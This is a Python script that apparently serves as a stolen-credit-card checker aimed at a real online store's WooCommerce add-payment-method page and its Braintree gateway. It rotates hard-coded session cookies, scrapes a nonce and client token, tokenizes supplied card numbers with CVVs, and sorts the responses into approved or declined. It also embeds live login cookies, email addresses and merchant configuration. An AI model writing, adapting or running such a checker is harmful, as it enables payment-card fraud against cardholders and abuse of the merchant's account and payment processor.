import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def Tele(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    print(n,mm,yy,cvc)
    
    last_used_times = {}
    
  while True:
    lines = '''chutiya%7C1727711521%7CrcAEt2wGcnRI53fraOJZCU86TorsNXemmyr7w7rpkLu%7C1db5fc15150007629b2ed598349a5eedbf35b6bc3cffe8bb6a5c75b9331d5ea0
sunnychut%7C1727708995%7C5Z0EtMRRUlJ38Pe1towuAnw0wUTTBZt0crxBkpwuOXr%7C7cc787db18700f2c852332e3a7276acd53081e85551b802f24b9d60c45d962ec'''

    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
	        time_since_last_use = current_time - last_used_times[big]
	        if time_since_last_use < 20:
	            continue
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
  cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    '_omappvp': 'Q1XNV3PzLEP2LUCID5OcT97bvSzGbMTLXqypsFXuZiyGqGSvybl59xv1muw0VtLX9Dhq3yVidCfH4sJjAiT7zfOe6nQ4HOj7',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-14%2017%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-14%2017%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%22%2C%22session_start_time%22%3A%222024-09-14%2017%3A07%3A38%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '_fbp': 'fb.1.1726335459299.490854331910055725',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_omra': '%7B%22z7fdrazgbaspcp1kvrhn%22%3A%22view%22%7D',
    '_gid': 'GA1.2.647205318.1726335465',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    'MCPopupClosed': 'yes',
    'tk_ai': '1Ui3dv8fgpG1L%2ByPIVv7%2Fyzt',
    'PHPSESSID': 'e451ec5e961ed04c7d00072b1f9124ef',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'omSeen-z7fdrazgbaspcp1kvrhn': '1726419187936',
    'om-z7fdrazgbaspcp1kvrhn': '1726419189856',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    '_ga': 'GA1.1.189350642.1726335457',
    'sbjs_current': '%C2%9E%C3%A9e',
    'mailchimp.cart.current_email': 'hiittvk@gmail.com',
    'mailchimp_user_previous_email': 'hiittvk%40gmail.com',
    'mailchimp_user_email': 'hiittvk%40gmail.com',
    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
    '_ga_SGEGXEGQDY': 'GS1.1.1726419180.6.1.1726419538.60.0.0',
    '_ga_WNQMQBX793': 'GS1.1.1726419181.6.1.1726419540.60.0.0',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F',
    'tk_qs': '',
}

  headers = {
    'authority': 'www.studynotesaba.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725852841.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725852842.60.0.0; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F; tk_qs=; _omappvs=1725852843982',
    'referer': 'https://www.studynotesaba.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  response = requests.get('https://www.studynotesaba.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'a9bf5370-61fe-4efd-ba89-65d47f2c4a14',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'Near Walmart 45',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    '_omappvp': 'Q1XNV3PzLEP2LUCID5OcT97bvSzGbMTLXqypsFXuZiyGqGSvybl59xv1muw0VtLX9Dhq3yVidCfH4sJjAiT7zfOe6nQ4HOj7',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-14%2017%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-14%2017%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%22%2C%22session_start_time%22%3A%222024-09-14%2017%3A07%3A38%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '_fbp': 'fb.1.1726335459299.490854331910055725',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_omra': '%7B%22z7fdrazgbaspcp1kvrhn%22%3A%22view%22%7D',
    '_gid': 'GA1.2.647205318.1726335465',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    'MCPopupClosed': 'yes',
    'tk_ai': '1Ui3dv8fgpG1L%2ByPIVv7%2Fyzt',
    'PHPSESSID': 'e451ec5e961ed04c7d00072b1f9124ef',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'omSeen-z7fdrazgbaspcp1kvrhn': '1726419187936',
    'om-z7fdrazgbaspcp1kvrhn': '1726419189856',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    '_ga': 'GA1.1.189350642.1726335457',
    'sbjs_current': '%C2%9E%C3%A9e',
    'mailchimp.cart.current_email': 'hiittvk@gmail.com',
    'mailchimp_user_previous_email': 'hiittvk%40gmail.com',
    'mailchimp_user_email': 'hiittvk%40gmail.com',
    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
    '_ga_SGEGXEGQDY': 'GS1.1.1726419180.6.1.1726419538.60.0.0',
    '_ga_WNQMQBX793': 'GS1.1.1726419181.6.1.1726419540.60.0.0',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F',
    'tk_qs': '',
}

  headers = {
    'authority': 'www.studynotesaba.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725853463.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725853465.60.0.0; _omappvs=1725853465873; sbjs_session=pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=',
    'origin': 'https://www.studynotesaba.com',
    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"f69b3f7256207f3e24d009cfb9bedb49","fraud_merchant_id":null,"correlation_id":"a9bf5370-61fe-4efd-ba89-65d47f2c"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU5Mzk4NjksImp0aSI6ImM1YjMwNDI4LTFiMDctNDViNy05MmU0LWFmMGM4MDU5M2IxZSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.fL5sViWnI6rhanmOeECeJRssG71O68zmtNgZejGPhsp0_a_lkYejo5nbxwQG0SzE7D7JR42QQg7Lf3ukCF_mSw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

  response = requests.post(
    'https://www.studynotesaba.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = "Sᴘᴀᴍ Dᴇᴛᴇᴄᴛᴇᴅ"
    else:
      result = "Declined"
      print(dead)
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
     print(added)
  else:
     return result
